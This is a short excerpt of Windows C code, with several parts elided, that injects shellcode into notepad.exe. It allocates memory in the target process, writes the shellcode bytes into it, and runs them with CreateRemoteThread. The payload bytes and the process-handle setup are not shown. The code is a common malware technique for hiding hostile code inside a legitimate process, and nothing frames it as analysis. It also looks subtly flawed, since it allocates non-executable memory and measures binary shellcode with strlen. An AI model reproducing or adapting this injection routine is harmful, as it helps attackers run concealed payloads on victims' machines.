...
VOID InvokeRemoteShellCode(wchar_t processName[], unsigned char shellCode[]) {
	...
	NTSTATUS status;
	SIZE_T size = strlen(shellCode) * sizeof(char);
	if (!(NT_SUCCESS(status = NtAllocateVirtualMemory(pHandle, &address, 0, (PSIZE_T)&size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) {
		printf("Error in NtAllocateVirtualMemory, the status is: %x", status);
		return;
	}
	if (!(NT_SUCCESS(status = NtWriteVirtualMemory(pHandle, address, (PVOID)shellCode, (ULONG)size, &bytesWritten)))) {
		printf("Error in NtWriteVirtualMemory, the status is: %x.\nThe number of bytes have been written: %d", status, bytesWritten);
		return;
	}
	CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
}
...
int main() {
	...
	InvokeRemoteShellCode(L"notepad.exe", shellcode);
}